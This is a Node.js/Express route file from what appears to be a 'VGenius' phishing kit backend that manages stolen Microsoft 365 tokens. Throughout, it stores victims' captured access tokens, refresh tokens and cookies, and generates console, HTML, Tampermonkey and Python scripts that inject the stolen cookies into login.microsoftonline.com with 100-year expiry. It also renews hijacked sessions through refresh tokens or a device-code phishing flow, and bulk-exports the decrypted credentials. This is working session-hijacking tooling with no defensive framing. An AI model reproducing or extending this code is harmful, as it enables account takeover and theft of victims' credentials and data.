const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// Get all tokens for user
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];

    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }

    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);

    let tokens;
    try {
      const [t] = await db.query(query.replace('SELECT id,', 'SELECT id, tenant,'), params);
      tokens = t;
    } catch {
      const [t] = await db.query(query, params);
      tokens = t.map(t => ({ ...t, tenant: 'common' }));
    }

    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);

    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single token with decrypted data
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    };

    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Update token notes
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Soft delete token
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate cookie script - Enhanced version with multiple domain support
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const cookies = decrypt(token.cookies_encrypted);

    if (!accessToken && !refreshToken && !cookies) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];

    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available' });
    }

    var scripts = {};
    scripts.console = generateConsoleScript(cookiesList);
    scripts.html = generateStandaloneHtml(cookiesList);
    scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
    scripts.python = generatePythonScript(cookiesList);

    res.json({
      script: scripts.console,
      scripts: scripts,
      cookie_count: cookiesList.length,
      cookies: cookiesList,
      generated_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

function parseCookies(cookieString) {
  if (!cookieString) return [];

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');

    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes and their values
      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower === 'samesite' || nameLower.startsWith('samesite=')) {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Store unique cookies by lowercase name (last occurrence wins)
      seenNames[nameLower] = {
        name: name,
        value: value,
        domain: '.login.microsoftonline.com'
      };
    }
  }

  // Convert object back to array
  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }

  return cookies;
}

// FIX: Use document.cookie instead of fetch interception
// This ensures cookies are actually set in the browser for login.microsoftonline.com
function generateConsoleScript(cookies) {
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var statements = cookies.map(function(c) {
    var domain = c.domain || '.login.microsoftonline.com';
    return 'document.cookie="' + c.name + '=' + c.value + '; domain=' + domain + '; expires=' + expStr + '; path=/; SameSite=None; secure"';
  }).join(';\n ');

  return '(function(){\n' +
    ' try {\n' +
    ' ' + statements + ';\n' +
    ' console.log("Injected ' + cookies.length + ' cookies");\n' +
    ' } catch(e){ console.error("Cookie inject failed:", e); }\n' +
    ' setTimeout(function(){ window.location.href="https://login.microsoftonline.com/?auth=2"; }, 1500);\n' +
    '})();';
}

// FIX: Use document.cookie instead of fetch interception
function generateStandaloneHtml(cookies) {
  var cookieJson = JSON.stringify(cookies);
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var bypassScript = '(function(){\n' +
    ' var cookies=' + cookieJson + ';\n' +
    ' var exp="' + expStr + '";\n' +
    ' for(var i=0;i<cookies.length;i++){\n' +
    ' try{\n' +
    ' var d=cookies[i].domain||".login.microsoftonline.com";\n' +
    ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n' +
    ' }catch(e){}\n' +
    ' }\n' +
    ' console.log("Injected "+cookies.length+" cookies");\n' +
    ' setTimeout(function(){window.location.href="https://login.microsoftonline.com/?auth=2";},1500);\n' +
    '})();';

  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += ' <meta charset="UTF-8">\n';
  html += ' <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
  html += ' <title>VGenius Cookie Injector</title>\n';
  html += ' <style>\n';
  html += ' body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
  html += ' button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
  html += ' button:hover { background: #00cca3; }\n';
  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
  html += ' </style>\n';
  html += '</head>\n<body>\n';
  html += ' <h1>VGenius Cookie Session Injector</h1>\n';
  html += ' <p>1. Go to https://login.microsoftonline.com</p>\n';
  html += ' <p>2. Press F12 to open console</p>\n';
  html += ' <p>3. Paste the script below and press Enter</p>\n';
  html += ' <p>4. The page will auto-redirect in 1.5 seconds</p>\n';
  html += ' <button onclick="copyScript()">Copy Script</button>\n';
  html += ' <pre id="script"></pre>\n';
  html += ' <script>\n';
  html += ' var bypassScript = ' + JSON.stringify(bypassScript) + ';\n';
  html += ' document.getElementById("script").textContent = bypassScript;\n';
  html += ' function copyScript() {\n';
  html += ' navigator.clipboard.writeText(bypassScript).then(function() {\n';
  html += ' alert("Script copied! Paste it in the Microsoft login console. It will auto-redirect in 1.5 seconds.");\n';
  html += ' });\n';
  html += ' }\n';
  html += ' </script>\n';
  html += '</body>\n</html>';

  return html;
}

// FIX: Use document.cookie instead of fetch interception
function generateTampermonkeyScript(cookies) {
  var cookieJson = JSON.stringify(cookies);
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var script = '// ==UserScript==\n';
  script += '// @name VGenius Cookie Injector (SES Bypass)\n';
  script += '// @namespace http://tampermonkey.net/\n';
  script += '// @version 2.0\n';
  script += '// @description Inject Microsoft cookies - bypasses SES lockdown\n';
  script += '// @author VGenius\n';
  script += '// @match https://login.microsoftonline.com/*\n';
  script += '// @grant none\n';
  script += '// ==/UserScript==\n\n';
  script += '(function() {\n';
  script += ' \'use strict\';\n\n';
  script += ' var cookies = ' + cookieJson + ';\n';
  script += ' var exp="' + expStr + '";\n\n';
  script += ' for(var i=0;i<cookies.length;i++){\n';
  script += ' try{\n';
  script += ' var d=cookies[i].domain||".login.microsoftonline.com";\n';
  script += ' document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n';
  script += ' }catch(e){}\n';
  script += ' }\n\n';
  script += ' console.log("VGenius: Injected "+cookies.length+" cookies");\n';
  script += ' \n';
  script += ' setTimeout(function() {\n';
  script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
  script += ' }, 2000);\n';
  script += '})();\n';

  return script;
}

function generatePythonScript(cookies) {
  var script = '#!/usr/bin/env python3\n';
  script += '# VGenius Cookie Session Injector - Python Version\n\n';
  script += 'import requests\n';
  script += 'from datetime import datetime\n\n';
  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
  script += 'session = requests.Session()\n\n';
  script += 'print("Injecting cookies...")\n';
  script += 'for cookie in cookies:\n';
  script += ' try:\n';
  script += ' session.cookies.set(\n';
  script += ' name=cookie["name"],\n';
  script += ' value=cookie["value"],\n';
  script += ' domain=cookie["domain"],\n';
  script += ' secure=True,\n';
  script += ' samesite="None"\n';
  script += ' )\n';
  script += ' print(f"Injected: {cookie[\'name\']}")\n';
  script += ' except Exception as e:\n';
  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
  script += 'print("\\nSession ready!")\n';
  script += 'print(f"Total cookies: {len(cookies)}")\n';
  script += 'print(f"Generated at: {datetime.now()}")\n';

  return script;
}

// Manual cookie renewal - opens popup for re-authentication and gets NEW tokens
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for renewal' });
    }

    // If we have a refresh token, use it to get new tokens directly (no popup needed)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';

        // Convert refresh token to new cookies using stored tenant
        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType, token.tenant || 'common');

        if (result.success && result.cookies) {
          // Update token in database with new cookies AND new tokens
          const ttlHours = 24 * 365 * 100; // 100 years

          // Use the NEW tokens from the exchange, not the old ones
          const newAccessToken = result.access_token || accessToken;
          const newRefreshToken = result.new_refresh_token || refreshToken;

          // Ensure they're different (access token and refresh token should never be the same)
          const finalAccessToken = newAccessToken !== newRefreshToken ? newAccessToken : accessToken;
          const finalRefreshToken = newRefreshToken;

          await db.query(
            `UPDATE captured_tokens 
             SET cookies_encrypted = ?, token_type = 'cookie', expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), 
                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1, 
                 access_token_encrypted = ?, refresh_token_encrypted = ? 
             WHERE id = ?`,
            [
              encrypt(result.cookies),
              ttlHours,
              encrypt(finalAccessToken),
              encrypt(finalRefreshToken),
              token.id
            ]
          );

          // Log renewal
          await db.query(
            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
          );

          return res.json({
            success: true,
            message: 'Session renewed successfully using refresh token',
            cookies: result.cookies,
            cookie_count: result.cookie_count
          });
        }
      } catch (refreshErr) {
        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
        // Fall back to device code flow if refresh token fails
      }
    }

    // Fallback: Start a new device code flow for re-authentication
    const deviceProxy = require('../services/deviceproxy');
    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const jwtToken = require('jsonwebtoken').sign(
      { user_id: req.user.id, link_id: token.link_id },
      require('../config/env').JWT_SECRET,
      { expiresIn: '1h' }
    );

    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);

    if (result.user_code) {
      // Store the renewal record
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
        [token.id, req.user.id, result.user_code]
      );

      res.json({
        success: true,
        job_id: result.job_id,
        user_code: result.user_code,
        verification_uri: result.verification_uri,
        message: 'Renewal initiated. Complete authentication in the popup window.',
        instructions: 'A popup will open. Enter the code and complete the Microsoft login to renew your session.'
      });
    } else {
      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
    }
  } catch (err) {
    const errorMsg = err.message || err.toString() || 'Unknown error';
    const errorCode = err.code || err.errno || 'RENEWAL_ERROR';
    console.error('[Tokens] Renewal error:', errorCode, errorMsg);
    res.status(500).json({ error: 'Renewal failed: ' + errorMsg, code: errorCode });
  }
});

// Get renewal history
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// One-shot console script for direct cookie injection (no proxy, no Electron)
// GET /api/inject-script?token_id=XYZ
router.get('/inject-script', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [token_id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for injection' });
    }

    // Use the REAL OAuth2 refresh token (not PRT blob)
    const realRefreshToken = refreshToken;

    if (!realRefreshToken) {
      return res.status(400).json({ error: 'No refresh token available. Cannot generate injection script.' });
    }

    // Get client_id from config (same one used in device code flow)
    const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

    // Use the token's stored tenant for correct Azure AD endpoint
    const tokenTenant = token.tenant || 'common';

    // Generate the one-shot console script with relative URLs for same-origin cookie storage
    const script = `(async function() {
      const refreshToken = "${realRefreshToken}";
      const clientId = "${clientId}";
      
      const body = new URLSearchParams({
        client_id: clientId,
        grant_type: "refresh_token",
        refresh_token: refreshToken,
        scope: "https://graph.microsoft.com/.default offline_access openid profile"
      });
      
      const endpoints = [
        "/${tokenTenant}/oauth2/v2.0/token",
        "/common/oauth2/v2.0/token",
        "/consumers/oauth2/v2.0/token"
      ];
      
      for (const url of endpoints) {
        try {
          const resp = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: body.toString(),
            credentials: "include"
          });
          
          if (resp.ok) {
            // Fresh cookies (ESTSAUTHPERSISTENT, esctx) are now set in the browser.
            window.location.href = "https://www.office.com/";
            return;
          }
        } catch (e) {}
      }
      
      alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
    })();`;

    res.type('application/javascript').send(script);
  } catch (err) {
    console.error('[Tokens] Inject script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// Manual cookie conversion from pasted access token
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type } = req.body;

    if (!access_token) {
      return res.status(400).json({ error: 'Access token is required' });
    }

    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(access_token, template_type || 'office');

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '100 years (if injected correctly)',
        instructions: 'Inject these cookies into browser console at .login.microsoftonline.com domain for persistent session'
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Manual conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// Export tokens
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export and delete all
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));

    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: true
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
